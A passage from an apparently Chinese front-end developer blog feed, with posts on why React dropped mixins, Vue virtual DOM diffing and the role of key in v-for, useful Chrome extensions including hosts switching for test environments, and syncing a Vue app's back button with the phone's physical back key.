href="#React为什么不用Mixin" class="headerlink" title="React为什么不用Mixin"></a><strong>React为什么不用Mixin</strong></h3><p>在 Facebook，React 的使用量已经从几个组件增长到了成千上万个。这给了我们一个去思考人们该如何更好的使用 React 的窗口。由于声明性渲染和自上而下的数据流，许多团队在采用 React 去实现一些新功能时，能够解决了很多之前难以去解决的 bug。</p><p>然而，使用 React 的一些代码不可避免地变得难以理解。有时候，React 团队会看到开发者不敢去碰某些项目中的组件。这些组件维护起来很容易出 bug，对新开发人员造成负担，最终组件会变得让创建这个组件的人都难以去维护。这种巨大的开发成本大部分是由 mixin 引起的。当时，我并没有在Facebook工作，但是在写下了我可怕的 mixin 之后，我得出了相同的结论—Mixins已经，组合永生。</p><p>这并不意味着 mixin 本身就是坏的。开发者们成功地在不同的语言和范例中使用 mixin，包括在一些函数式编程语言中。在 Facebook，我们广泛使用 Hack 中与 mixin 非常相似的特性。但是，我们依旧认为 mixin 在 React 代码库中是不必要的和有问题的。下面的内容是我们这样认为的原因。</p><p><br></p><h3 id="Mixin-引入了隐式依赖关系"><a href="#Mixin-引入了隐式依赖关系" class="headerlink" title="Mixin 引入了隐式依赖关系"></a><strong>Mixin 引入了隐式依赖关系</strong></h3><p>有时一个组件依赖于mixin中定义的某个方法，比如getClassName（）。有时候是相反的，mixin在组件上调用renderHeader（）方法。 JavaScript是一种动态语言，所以很难执行或记录这些依赖关系。</p><p>Mixin打破了常见且通常安全的假设，即可以通过在组件文件中搜索其出现来重命名状态键或方法。你可能会写一个有状态的组件，然后你的同事可能会添加一个读取这个状态的mixin。在几个月内，您可能需要将该状态移至父组件，以便与兄弟组件共享。你会记得更新mixin来读取道具吗？如果现在其他组件也使用这个mixin呢？</p><p>这些隐含的依赖性使新团队成员难以贡献代码库。一个组件的render（）方法可能会引用一些未在该类上定义的方法。移除安全吗？也许它是在一个mixin中定义的。但是其中哪一个呢？您需要向上滚动到mixin列表，打开每个文件，然后查找此方法。更糟的是，mixin可以指定他们自己的mixin，所以搜索可以很深入。</p><p>mixin经常依赖于其他的mixin，而删除其中的一个会打破另一个。在这些情况下，告诉数据如何进出mixin是非常棘手的，以及它们的依赖关系图是什么样的。与组件不同，mixin不构成层次结构：它们被夷为平地并在相同的名称空间中运行。</p><p><br></p><h3 id="Mixins导致名称冲突"><a href="#Mixins导致名称冲突" class="headerlink" title="Mixins导致名称冲突"></a><strong>Mixins导致名称冲突</strong></h3><p>不能保证两个特定的mixin可以一起使用。例如，如果FluxListenerMixin定义了handleChange（）和WindowSizeMixin定义了handleChange（），则不能一起使用它们。你也不能在你自己的组件上定义一个带有这个名字的方法。</p><p>如果你控制混入代码，这不是什么大不了的事情。如果发生冲突，可以在其中一个mixin上重命名该方法。然而，这很棘手，因为一些组件或其他mixin可能已经直接调用这个方法，你也需要找到并修复这些调用。</p><p>如果你的名字与第三方包中的mixin有冲突，你不能只重命名一个方法。相反，您必须在您的组件上使用尴尬的方法名称以避免冲突。</p><p>mixin作者的情况并不好。即使向mixin添加一个新的方法总是一个潜在的重大改变，因为一个名称相同的方法可能已经存在于一些使用它的组件，直接或通过另一个mixin。一旦写入，mixin很难删除或更改。不好的想法不会被重构，因为重构风险太大。</p><p><br></p><h3 id="Mixin导致复杂的滚雪球"><a href="#Mixin导致复杂的滚雪球" class="headerlink" title="Mixin导致复杂的滚雪球"></a><strong>Mixin导致复杂的滚雪球</strong></h3><p>即使mixin开始简单，随着时间的推移，它们往往会变得复杂。下面的例子是基于我在代码库中看到的真实场景。</p><p>组件需要一些状态来跟踪鼠标悬停。为了保持这个逻辑可重用，你可以将handleMouseEnter（），handleMouseLeave（）和isHovering（）提取到一个HoverMixin中。接下来，有人需要实施一个工具提示。他们不想复制HoverMixin中的逻辑，以便创建使用HoverMixin的TooltipMixin。 TooltipMixin读取HoverMixin在其componentDidUpdate（）中提供的isHovering（），并显示或隐藏工具提示。</p><p>几个月后，有人想让工具提示方向可配置。为了避免代码重复，他们添加了一个名为getTooltipOptions（）的新的可选方法到TooltipMixin。到目前为止，显示popovers的组件也使用HoverMixin。然而，popovers需要不同的悬停延迟。为了解决这个问题，有人增加了对可选的getHoverOptions（）方法的支持，并在TooltipMixin中实现它。那些混合现在是紧密耦合的。</p><p>没有新的要求，这很好。但是这个解决方案不能很好地扩展。如果你想支持在单个组件中显示多个工具提示呢？你不能在一个组件中定义两次相同的mixin。如果工具提示需要在导游中自动显示，而不是悬停，怎么办？祝你好运解耦TooltipMixin从HoverMixin。如果您需要支持悬停区域和工具提示锚点位于不同组件的情况，该怎么办？你不能轻易地把混入到父组件中的状态提升起来。与组件不同，mixin不会自然地适应这种变化。</p><p>每一个新的要求都会让混音变得更难理解。使用相同mixin的组件越来越与时间耦合。任何新的能力被添加到使用该mixin的所有组件。如果没有复制代码或在mixin之间引入更多的依赖性和间接性，就没有办法拆分mixin的“更简单”的部分。逐渐地，封装边界逐渐消失，由于很难改变或移除现有的混合，他们不断变得抽象，直到没人理解它们是如何工作的。</p><p>这些与我们在React之前构建应用程序的问题是一样的。我们发现它们是通过声明性渲染，自顶向下的数据流和封装组件来解决的。在Facebook上，我们一直在迁移我们的代码以使用替代模式来混合，我们对结果普遍感到满意。你可以阅读下面的模式。</p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://reactjs.org/blog/2016/07/13/mixins-considered-harmful.html" target="_blank" rel="noopener">Mixins Considered Harmful</a></li><li><a href="https://lizhiyao.github.io/2018/01/05/f2e/mixins-considered-harmful/" target="_blank" rel="noopener">Mixins 或许不太好</a></li></ul>]]></content>
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Vue Dom Diff(v-for为什么要加key)</title>
      <link href="/2019/12/16/Vue-key/"/>
      <url>/2019/12/16/Vue-key/</url>
      <content type="html"><![CDATA[<blockquote><p>key 的作用主要是给 VNode 添加唯一标识，通过这个 key，可以更快找到新旧 VNode 的变化，从而进一步操作。</p></blockquote><h3 id="1-原生DOM-vs-虚拟DOM"><a href="#1-原生DOM-vs-虚拟DOM" class="headerlink" title="1. 原生DOM vs 虚拟DOM"></a>1. 原生DOM vs 虚拟DOM</h3><p>这是一个性能 vs. 可维护性的取舍。框架的意义在于为你掩盖底层的 DOM 操作，让你用更声明式的方式来描述你的目的，从而让你的代码更容易维护。没有任何框架可以比纯手动的优化 DOM 操作更快，因为框架的 DOM 操作层需要应对任何上层 API 可能产生的操作，它的实现必须是普适的。针对任何一个 benchmark，我都可以写出比任何框架更快的手动优化，但是那有什么意义呢？在构建一个实际应用的时候，你难道为每一个地方都去做手动优化吗？出于可维护性的考虑，这显然不可能。框架给你的保证是，你在不需要手动优化的情况下，我依然可以给你提供过得去的性能。</p><h4 id="虚拟DOM的作用"><a href="#虚拟DOM的作用" class="headerlink" title="虚拟DOM的作用"></a>虚拟DOM的作用</h4><p>虚拟DOM就是一个用来描述真实DOM的javaScript对象。</p><p>Virtual DOM的主要思想就是模拟DOM的树状结构，在内存中创建保存映射DOM信息的节点数据。视图需要更新时，先对节点数据进行diff后得到差异结果后，再一次性对DOM进行批量更新操作。</p><ul><li>跟踪视图状态，比较前后两次DOM更新真实DOM，减少操作DOM的范围</li><li>跨平台使用：浏览器渲染，服务器渲染，小程序等</li></ul><p><br></p><h3 id="2-Diff算法"><a href="#2-Diff算法" class="headerlink" title="2. Diff算法"></a>2. Diff算法</h3><ul><li>使用<code>h()</code>函数创建JS对象(VNode)描述真实DOM</li><li>创建<code>patch()</code>比较新旧两个VNode<ul><li><code>patch(oldVNode, newVnode)</code></li><li>按层级diff，而非深度优先遍历</li><li>比较新旧节点是否相同节点（key, sel相同），如果不是相同节点，删除之前的，重新渲染；如果是相同节点，判断VNode是否有text，有直接更新text文本内容</li><li>新老节点有children属性且不等，走updateChildren</li></ul></li><li>把变化的内容更新到真实DOM树</li></ul><h4 id="2-1-按层级diff，而非深度优先遍历"><a href="#2-1-按层级diff，而非深度优先遍历" class="headerlink" title="2.1 按层级diff，而非深度优先遍历"></a><em>2.1 按层级diff，而非深度优先遍历</em></h4><p>UI中很少出现DOM的层级结构因为交互而产生更新。因此VirtualDOM的diff策略是在新旧节点树之间按层级进行diff得到差异，而非传统的按深度遍历搜索。<br><img src="/2019/12/16/Vue-key/1.png"></p><p><br></p><h4 id="2-2-不同类型的节点，会创建新的VirtualDom替换旧的"><a href="#2-2-不同类型的节点，会创建新的VirtualDom替换旧的" class="headerlink" title="2.2 不同类型的节点，会创建新的VirtualDom替换旧的"></a><em>2.2 不同类型的节点，会创建新的VirtualDom替换旧的</em></h4><p>VirtualDOM中的节点数据对应的是一个原生DOM节点，或者vue/react中的一个组件。不同类型的节点往往相差很大，当节点类型发生改变时，则不进行子树的比较，直接创建新类型的VirtualDOM，替换旧节点。<br><img src="/2019/12/16/Vue-key/2.png"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// snabbdom.js</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sameVnode</span>(<span class="params">vnode1, vnode2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> vnode1.key === vnode2.key &amp;&amp; vnode1.sel === vnode2.sel;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">patch</span>(<span class="params">oldVnode, vnode</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 相同类型的Vnode，比较后更新</span></span><br><span class="line">    <span class="keyword">if</span> (sameVnode(oldVnode, vnode)) &#123;</span><br><span class="line">        patchVnode(oldVnode, vnode)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 不同类型的Vnode，创建新的节点，替换旧的节点</span></span><br><span class="line">        elm = oldVnode.elm</span><br><span class="line">        parent = api.parentNode(elm)</span><br><span class="line">        createElm(vnode)</span><br><span class="line">        <span class="keyword">if</span> (parent !== <span class="literal">null</span>) &#123;</span><br><span class="line">            api.insertBefore(parent, vnode.elm, api.nextSibling(elm))</span><br><span class="line">            removeVnodes(parent, [oldVnode])</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-3-新旧节点都有children且不等，走updateChildren"><a href="#2-3-新旧节点都有children且不等，走updateChildren" class="headerlink" title="2.3 新旧节点都有children且不等，走updateChildren"></a><em>2.3 新旧节点都有children且不等，走updateChildren</em></h4><ul><li>oldStartVnode/newStartVnode(旧开始节点/新开始节点)相同</li><li>oldEndVnode/newEndVnode(旧结束节点/新结束节点)相同</li><li>oldStartVnode/newEndVnode(旧开始节点/新结束节点)相同</li><li>oldEndVnode/newStartVnode(旧结束节点/新开始节点)相同</li><li>特殊情况当1,2,3,4的情况都不符合的时候就会执行,在oldVnodes里面寻找跟newStartVnode一样的节点然后位移到oldStartVnode,若没有找到在就oldStartVnode创建一个</li></ul><h4 id="优化列表更新性能"><a href="#优化列表更新性能" class="headerlink" title="优化列表更新性能"></a>优化列表更新性能</h4><p>当被diff的节点处于同一层级时，可以执行 插入、移动和删除三种操作。同时提供用户设置key属性的方式调整排序。<br><img src="/2019/12/16/Vue-key/3.png"></p><p>下面看看snabbdom怎么处理这个<em><code>key</code></em>值。<br>(snabbdom仅有300行代码，被vue2.0收入来实现DOM比较和更新)</p><h4 id="列表头插入元素"><a href="#列表头插入元素" class="headerlink" title="列表头插入元素"></a>列表头插入元素</h4><p>发现oldCh里没有当前newCh中的节点，将新节点插入到oldStartVnode的前边。<br><img src="/2019/12/16/Vue-key/4.png" style="max-width: 500px; margin-top: 20px"></p><p><br></p><h4 id="列表重新排序"><a href="#列表重新排序" class="headerlink" title="列表重新排序"></a>列表重新排序</h4><p>如果oldCh中有这个key值，就对旧节点进行更新，再将其插入到当前的oldStartVnode的前面。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createKeyToOldIdx</span>(<span class="params">children, beginIdx, endIdx</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> i, map = &#123;&#125;, key, ch</span><br><span class="line">    <span class="keyword">for</span>( i = beginIdex; i &lt; endIdx; ++i) &#123;</span><br><span class="line">        ch = children[i]</span><br><span class="line">        <span class="keyword">if</span> (ch != <span class="literal">null</span>) &#123;</span><br><span class="line">            key = ch.key</span><br><span class="line">            <span class="keyword">if</span> (key !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">                map[key] = i</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateChild</span>(<span class="params">parentElm, oldVnode, vnode</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> oldCh = oldVnode.children</span><br><span class="line">    <span class="keyword">var</span> ch = vnode.children</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> oldStartIdx = <span class="number">0</span>, newStartIdx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> oldEndIdx = oldCh.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> oldStartVnode = oldCh[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">var</span> oldEndVnode = oldCh[oldEndIdx];</span><br><span class="line">    <span class="keyword">var</span> newEndIdx = newCh.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> newStartVnode = newCh[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">var</span> newEndVnode = newCh[newEndIdx];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> oldKeyToIdx; <span class="comment">// &#123; key1: index1, key2: index2 &#125; key值: 在旧列表中的索引</span></span><br><span class="line">    <span class="keyword">var</span> idxInOld;</span><br><span class="line">    <span class="keyword">var</span> elmToMove;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (oldStartIdx &lt;= oldEndInx &amp;&amp; newStartIdx &lt;= newEndIdx) &#123;</span><br><span class="line">        <span class="keyword">if</span> (sameVnode(...)) &#123;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (oldKeyToIdx === <span class="literal">undefined</span>) &#123;</span><br><span class="line">                oldKeyToIdx = createKeyToOldIdx(oldCh, oldStartIdx, oldEndIdx)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            idxInOld = oldKeyToIdx(newStartVnode.key)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (isUndef(idxInOld)) &#123;</span><br><span class="line">                <span class="comment">// 旧列表没有这个key</span></span><br><span class="line">                <span class="comment">// insertBefore(parentNode, newNode, referenceNode)</span></span><br><span class="line">                api.insertBefore(parentElm, createElm(newStartVnode), oldStartVnode.elm)</span><br><span class="line">                newStartVnode = newCh[++newStartIdx]</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 旧列表有这个key</span></span><br><span class="line">                elmToMove = oldCh[idxInOld] <span class="comment">// 找到要移动的elem</span></span><br><span class="line">                oldCh[idxInOld] = <span class="literal">undefined</span></span><br><span class="line">                api.insertBefore(parentElm, elmToMove.elm, oldStartVnode.elm)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-Key"><a href="#3-Key" class="headerlink" title="3. Key"></a>3. Key</h3><p><em>v-for为什么要加Key?</em></p><ul><li>Diff操作更加快速</li><li>Diff操作更加准确（避免渲染错误）</li></ul><h4 id="3-1-Diff操作更加快速"><a href="#3-1-Diff操作更加快速" class="headerlink" title="3.1 Diff操作更加快速"></a>3.1 Diff操作更加快速</h4><p>当递归DOM节点的子元素时，Vue会同时遍历两个子元素的列表，当产生差异时，生成一个DOM操作。<br>在列表末尾新增元素时，变更开销比较小。Vue遍历列表，发现前两个元素没变，然后插入第三个元素。<br>在列表头部插入时，Vue依次遍历下来，会针对每个子元素都生成了DOM操作。</p><p><strong>明明移动节点就可以解决问题，却变成了DOM节点不断地删除和重建！</strong><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>first<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>second<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>zero<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>first<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>second<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>这种情况多数出现在<code>v-for</code>。<br>出现<code>v-for</code>时， Vue会认为又有更新列表的操作了！<br><strong>这个列表DOM更新的性能问题又要出现了！</strong><br>这时，控制台会提醒我们: 加个<em><code>key</code></em>啊！！！！！</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">"1"</span>&gt;</span>first<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">"2"</span>&gt;</span>second<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">"0"</span>&gt;</span>zero<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">"1"</span>&gt;</span>first<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">"2"</span>&gt;</span>second<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>key</code>这个属性不是给用户用的，而是给Vue自己用的。Vue需要判断，对数组中的每一项，到底是新建一个元素加入到页面中，还是更新原来的元素。从而避免组件被不必要地重建。</p><h4 id="3-2-避免渲染错误"><a href="#3-2-避免渲染错误" class="headerlink" title="3.2 避免渲染错误"></a>3.2 避免渲染错误</h4><p>因为没有设置key,默认都是undefined,所以节点都是相同的,更新了text的内容但还是沿用了之前的dom,所以实际上a-&gt;z(a原本打勾的状态保留了,只改变了text)</p><p><br></p><p><br></p><h3 id="4-注意"><a href="#4-注意" class="headerlink" title="4. 注意"></a>4. 注意</h3><ul><li>开发者可以通过key prop来暗示哪些子元素在不同的渲染下能保持稳定。Key应该具有稳定，可预测，以及列表内唯一的特质。不稳定的key(通过<code>Math.random()</code>生成的)会导致许多组件实例和DOM节点被不必要地重新创建，可能会导致性能下降和子组件中的状态丢失。</li><li>【真实情景】上传多张发票，上传后自动识别发票数据，用户可以修改数据。点击图片，切换发票数据的修改。这时需要给<code>&lt;form&gt;</code>添加<code>key</code>值，否则在切换时，Vue会认为这是同一个组件。会把一些校验提示带到下一个发票表单。</li></ul><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://juejin.im/post/5b0638a9f265da0db53bbb6d" target="_blank" rel="noopener">探索Virtual DOM的前世今生</a></li><li><a href="https://zh-hans.reactjs.org/docs/reconciliation.html" target="_blank" rel="noopener">React Diff算法</a></li><li><a href="https://github.com/snabbdom/snabbdom" target="_blank" rel="noopener">snabbdom</a></li><li><a href="https://juejin.im/post/5c8e5e4951882545c109ae9c" target="_blank" rel="noopener">让虚拟DOM和DOM-diff不再成为你的绊脚石</a></li><li><a href="https://fed.taobao.org/blog/taofed/do71ct/react-key/?spm=taofed.blogs.blog-list.9.29eb5ac8BdaVc1" target="_blank" rel="noopener">React 实践心得：key 属性的原理和用法</a></li><li><a href="https://www.zhihu.com/people/111111-80-11-31" target="_blank" rel="noopener">网上都说操作真实 DOM 慢，但测试结果却比 React 更快，为什么？</a></li></ul>]]></content>
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Chrome插件</title>
      <link href="/2019/12/13/Chrome%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90/"/>
      <url>/2019/12/13/Chrome%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90/</url>
      <content type="html"><![CDATA[<h4 id="1-Octotree"><a href="#1-Octotree" class="headerlink" title="1. Octotree"></a><em>1. Octotree</em></h4><p>将github项目代码以树形格式展示</p><h4 id="2-Vue-js-devtools"><a href="#2-Vue-js-devtools" class="headerlink" title="2. Vue.js devtools"></a><em>2. Vue.js devtools</em></h4><p>Vue调试插件</p><h4 id="3-二维码生成器-Quick-QR"><a href="#3-二维码生成器-Quick-QR" class="headerlink" title="3. 二维码生成器(Quick QR)"></a><em>3. 二维码生成器(Quick QR)</em></h4><p>将当前页面地址转化成二维码，也可以任意输入内容转化成二维码</p><h4 id="4-SwitchyOmega"><a href="#4-SwitchyOmega" class="headerlink" title="4. SwitchyOmega"></a><em>4. SwitchyOmega</em></h4><p>切换测试环境的方法有两种</p><ul><li>根据域名直接访问对应的测试环境，如果遇到跨域问题，就使用devServer, nginx反向代理</li><li>修改本地host文件，让请求地址指向测试环境地址<blockquote><p>Hosts是一个没有扩展名的系统文件，其基本作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”。当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则会将网址提交DNS域名解析服务器进行IP地址的解析。</p></blockquote></li></ul><p>当sit, uat生产环境出现bug，需要在本地重现，这时需要请求线上的数据，使用SwitchOmega插件，可以无缝切换host。假设本地环境请求url是<code>10.23.31.122</code>，修改host后，实际请求到的地址是<code>hbank.haday.cn:8093</code><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 设置情景模式</span><br><span class="line"><span class="meta">#</span> 请求url -&gt; 修改host后实际请求的地址</span><br><span class="line">10.23.21.122 hbank.haday.cn:8093</span><br><span class="line">10.23.21.122 www.baidu.com</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>手机浏览器物理返回键</title>
      <link href="/2019/12/06/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E8%B7%AF%E7%94%B1/"/>
      <url>/2019/12/06/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E8%B7%AF%E7%94%B1/</url>
      <content type="html"><![CDATA[<h3 id="1-物理返回键"><a href="#1-物理返回键" class="headerlink" title="1. 物理返回键"></a>1. 物理返回键</h3><h4 id="1-1-需求"><a href="#1-1-需求" class="headerlink" title="1.1 需求"></a>1.1 需求</h4><p>一个移动端的项目，产品希望页面上的返回按钮，和手机的物理返回键逻辑保持一致。需要满足下面几个要求</p><ul><li>页面上的返回按钮，与物理返回键效果保持一致</li><li>返回后，点击物理前进键能正常前进</li><li>当前页面打开了一个组件，刷新页面，组件要正常显示</li><li>当用户打开一个新的tab，地址是/#/A?model=B，需要正常显示组件B</li></ul><p><br></p><h4 id="1-2-用例"><a href="#1-2-用例" class="headerlink" title="1.2 用例"></a>1.2 用例</h4><ul><li>页面A -&gt; 组件B</li><li>页面A -&gt; 组件B -&gt; 页面A</li><li>页面A -&gt; 组件B -&gt; 组件C</li><li>页面A -&gt; 组件B -&gt; 刷新（组件B不会消失）</li><li>打开一个新页面(/#/A?modal=B) -&gt; 组件B -&gt; 点击返回 -&gt; 页面A</li></ul><p><br></p><h4 id="1-3-解决方法"><a href="#1-3-解决方法" class="headerlink" title="1.3 解决方法"></a>1.3 解决方法</h4><ul><li>页面的返回按钮统一用 <code>this.$router.go(-1)</code></li><li>显示弹框(组件)统一用<code>pushState</code>更改hash，向路由历史推入一个记录，使路由变成 /#/A?model=B。这里的页面A始终不会被刷新</li><li>组件内监听路由变化，监听到上面两个动作，执行显示和隐藏组件动作</li><li>访问地址/#/A?model=B，正常显示B。在组件的mounted方法，检查路由是否带modal， 如果是需要按需推进多个路由路径（保证后退正常）</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    name: <span class="string">'component-name'</span>,</span><br><span class="line">    watch: &#123;</span><br><span class="line">        <span class="string">'$route.query'</span>(newVal, oldVal) &#123;</span><br><span class="line">            <span class="keyword">if</span> (oldVal.modal === <span class="keyword">this</span>.$options.name &amp;&amp; !newVal.modal) &#123;</span><br><span class="line">                <span class="keyword">this</span>.visible = <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (newVal.modal === <span class="keyword">this</span>.$options.name) &#123;</span><br><span class="line">                <span class="keyword">this</span>.visible = <span class="literal">true</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        <span class="comment">// 显示附件列表</span></span><br><span class="line">        showModal () &#123;</span><br><span class="line">            <span class="keyword">this</span>.$router.push(&#123; </span><br><span class="line">                path: <span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.$route.path&#125;</span>`</span>, </span><br><span class="line">                query: &#123; <span class="attr">modal</span>: <span class="keyword">this</span>.$options.name &#125; </span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">// 隐藏附件列表</span></span><br><span class="line">        hideModal () &#123;</span><br><span class="line">            <span class="keyword">this</span>.$router.go(<span 